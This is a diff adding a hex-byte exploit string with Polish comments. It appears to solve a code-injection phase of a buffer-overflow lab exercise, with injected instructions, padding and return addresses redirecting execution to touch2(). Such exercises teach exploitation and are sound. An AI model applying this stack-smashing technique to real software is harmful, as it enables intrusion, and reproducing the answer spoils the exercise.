@@ -1,0 +1,11 @@
+/* wstrzyknięty kod */
+48 c7 c7 29 c5 eb 74 c3
+/* padding */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+/* adres powrotu do wstrzykniętego kodu */
+98 66 63 55 00 00 00 00
+/* adres powrotu do touch2() */
+35 1c 40 00 00 00 00 00
